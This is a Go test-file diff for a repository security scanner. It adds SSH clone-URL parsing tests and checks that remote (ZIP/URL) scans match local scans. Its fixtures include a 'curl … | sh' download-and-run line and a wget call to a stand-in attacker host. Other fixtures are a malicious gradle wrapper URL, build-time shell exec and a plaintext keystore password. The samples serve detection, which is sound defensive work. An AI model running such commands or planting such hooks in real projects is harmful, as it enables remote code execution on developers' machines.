@@ -6,6 +6,7 @@ import (
 	"os"
 	"path/filepath"
 	"sort"
+	"strings"
 	"testing"
 )
 
@@ -15,14 +16,21 @@ func TestParseRemoteURL(t *testing.T) {
 		host  string
 		owner string
 		repo  string
+		clone string
 	}{
-		{"https://github.com/owner/repo.git", "github.com", "owner", "repo"},
-		{"https://github.com/owner/repo", "github.com", "owner", "repo"},
-		{"git@github.com:owner/repo.git", "github.com", "owner", "repo"},
-		{"ssh://git@github.com/owner/repo.git", "github.com", "owner", "repo"},
-		{"github.com/owner/repo", "github.com", "owner", "repo"},
-		{"owner/repo", "github.com", "owner", "repo"},
-		{"https://gitlab.com/group/sub/repo.git", "gitlab.com", "group/sub", "repo"},
+		{"https://github.com/owner/repo.git", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
+		{"https://github.com/owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo"},
+		{"git@github.com:owner/repo.git", "github.com", "owner", "repo", "git@github.com:owner/repo.git"},
+		{"ssh://git@github.com/owner/repo.git", "github.com", "owner", "repo", "ssh://git@github.com/owner/repo.git"},
+		{"github.com/owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
+		{"owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
+		{"https://gitlab.com/group/sub/repo.git", "gitlab.com", "group/sub", "repo", "https://gitlab.com/group/sub/repo.git"},
+		// An SSH URL keeps its SSH form. The clone command the report prints has
+		// to work as typed, and a GitLab subgroup stays in the owner.
+		{"git@github.com:nisrulz/android-spacex-app.git", "github.com", "nisrulz", "android-spacex-app",
+			"git@github.com:nisrulz/android-spacex-app.git"},
+		{"git@gitlab.com:group/sub/repo.git", "gitlab.com", "group/sub", "repo",
+			"git@gitlab.com:group/sub/repo.git"},
 	}
 	for _, c := range cases {
 		got, err := parseRemoteURL(c.in, "", "")
@@ -34,6 +42,37 @@ func TestParseRemoteURL(t *testing.T) {
 			t.Errorf("parseRemoteURL(%q) = %s/%s/%s, want %s/%s/%s",
 				c.in, got.host, got.owner, got.repo, c.host, c.owner, c.repo)
 		}
+		if got.clone != c.clone {
+			t.Errorf("parseRemoteURL(%q) clone = %q, want %q", c.in, got.clone, c.clone)
+		}
+	}
+}
+
+// TestSSHTargetIsRemoteAndReadable covers the whole shape of an SSH argument:
+// it is treated as remote, it parses into parts, and the clone advice keeps SSH
+// so the reader can actually run the command the report prints.
+func TestSSHTargetIsRemoteAndReadable(t *testing.T) {
+	const target = "git@github.com:nisrulz/android-spacex-app.git"
+
+	if !isRemoteArg(target) {
+		t.Fatalf("isRemoteArg(%q) = false, want true", target)
+	}
+	rt, err := parseRemoteURL(target, "main", "")
+	if err != nil {
+		t.Fatalf("parseRemoteURL: %v", err)
+	}
+	if rt.host != "github.com" {
+		t.Errorf("host = %q, want github.com so the GitHub API source is used", rt.host)
+	}
+	if rt.display() != "github.com/nisrulz/android-spacex-app (ref: main)" {
+		t.Errorf("display = %q", rt.display())
+	}
+	if rt.clone != target {
+		t.Errorf("clone = %q, want the SSH URL unchanged so the advice runs", rt.clone)
+	}
+	// An SSH URL without a .git suffix still resolves to the same repository.
+	if _, err := parseRemoteURL(strings.TrimSuffix(target, ".git"), "", ""); err != nil {
+		t.Errorf("parseRemoteURL on the suffix-less form: %v", err)
 	}
 }
 
@@ -104,6 +143,112 @@ func TestScanRemoteSource(t *testing.T) {
 			t.Errorf("missing finding %q in %+v", want, findings)
 		}
 	}
+}
+
+// TestScanRemoteSourceRunsTheSameSurfaceAsALocalScan is the guard for the
+// detector gap this closes. The shell and Android checks used to be wired to
+// repoLayout and walkTree, so scanRemoteSource never reached them: a ZIP or a
+// URL scan reported a tree containing `curl … | sh` as clean while the local scan
+// on the same tree called it CRITICAL.
+//
+// The test runs both paths over one set of files and compares the finding
+// titles, so adding a file to one detector and forgetting the other fails here
+// rather than quietly reopening the gap.
+func TestScanRemoteSourceRunsTheSameSurfaceAsALocalScan(t *testing.T) {
+	files := map[string]string{
+		// shell
+		"setup.sh":         "curl -sL https://evil.example/x.sh | sh\n",
+		"scripts/build.sh": "wget https://evil.example/t\n",
+		".envrc":           "export PATH=./bin\n",
+		"Makefile":         "install:\n\tadb install app.apk\n",
+		// android
+		"build.gradle.kts":                         "task t { exec { commandLine 'sh', 'x' } }\n",
+		"app/build.gradle":                         "storePassword hunter2\n",
+		"gradle.properties":                        "storePassword=hunter2\n",
+		"local.properties":                         "sdk.dir=/Users/me/Android/Sdk\n",
+		"gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://evil.example/gradle.zip\n",
+		"src/main/cpp/CMakeLists.txt":              "execute_process(COMMAND sh x.sh)\n",
+		"src/main/jni/Android.mk":                  "LOCAL_LDFLAGS := $(shell id)\n",
+		"release.jks":                              "binary",
+		".vscode/tasks.json":                       `{"tasks":[{"command":"adb shell am start"}]}`,
+		// not a surface file
+		"docs/notes.md":          "prose only",
+		"src/main/java/App.java": "class App {}",
+	}
+
+	root := makeRepo(t, "[core]\n")
+	for name, body := range files {
+		writeFile(t, filepath.Join(root, filepath.FromSlash(name)), body)
+	}
+	writeFile(t, filepath.Join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\n")
+
+	localFindings := scan(t, root)
+	local := titleSet(worktreeOnly(localFindings))
+
+	src := fakeSource{
+		files: map[string][]byte{".git/hooks/pre-commit": []byte("#!/bin/sh\n")},
+		hooks: []string{".git/hooks/pre-commit"},
+	}
+	for name, body := range files {
+		src.files[name] = []byte(body)
+	}
+	var remote []Finding
+	scanRemoteSource(src, func(f Finding) { remote = append(remote, f) })
+	remote = worktreeOnly(remote)
+
+	missing := map[string]bool{}
+	for title := range local {
+		missing[title] = true
+	}
+	for _, f := range remote {
+		delete(missing, f.Title)
+	}
+	if len(missing) != 0 {
+		t.Errorf("the ZIP/URL path missed findings the local scan reported:\n  missing %v\n  local   %v\n  remote  %v",
+			keys(missing), keys(local), titles(remote))
+	}
+
+	// The two findings that motivated the fix have to be present.
+	if !hasTitlePrefix(remote, "Setup script pipes into an interpreter") {
+		t.Errorf("the setup script pipe is missing from the ZIP/URL path: %v", titles(remote))
+	}
+	if !hasTitlePrefix(remote, "Gradle script runs a command") {
+		t.Errorf("the Gradle exec is missing from the ZIP/URL path: %v", titles(remote))
+	}
+}
+
+// worktreeOnly drops the findings that come out of a .git directory. Those are
+// the one documented gap between a local scan and a ZIP or URL scan, and they
+// arrive by a different mechanism on each path: the local scan lists the hooks
+// directory, the remote path reports tracked hook files. Comparing them here
+// would test the wrong thing; see the limits table in the README.
+func worktreeOnly(findings []Finding) []Finding {
+	var out []Finding
+	for _, f := range findings {
+		slashed := filepath.ToSlash(f.Path)
+		if strings.Contains(slashed, "/.git/") || strings.HasPrefix(slashed, ".git/") {
+			continue
+		}
+		out = append(out, f)
+	}
+	return out
+}
+
+func titleSet(findings []Finding) map[string]bool {
+	set := map[string]bool{}
+	for _, f := range findings {
+		set[f.Title] = true
+	}
+	return set
+}
+
+func keys(m map[string]bool) []string {
+	out := make([]string, 0, len(m))
+	for k := range m {
+		out = append(out, k)
+	}
+	sort.Strings(out)
+	return out
 }
 
 func TestScanRemoteSourceClean(t *testing.T) {
